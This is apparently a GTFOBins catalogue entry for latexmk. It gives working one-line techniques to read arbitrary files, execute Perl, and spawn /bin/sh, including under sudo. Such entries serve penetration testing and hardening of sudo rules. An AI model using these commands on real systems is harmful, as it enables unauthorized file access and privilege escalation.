<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/latexmk -->
---
functions:
  file-read:
  - binary: false
    code: |-
      echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
      latexmk -dvi /path/to/temp-file
      strings temp-file.dvi
    comment: |-
      The read file will be part of the output.
    contexts:
      sudo:
      unprivileged:
  inherit:
  - code: |-
      latexmk -e '...'
    comment: |-
      This allows to run Perl code (`...`).
    contexts:
      sudo:
      unprivileged:
    from: perl
  shell:
  - code: |-
      latexmk -pdf -pdflatex='/bin/sh #' /dev/null
    contexts:
      sudo:
      unprivileged:
...
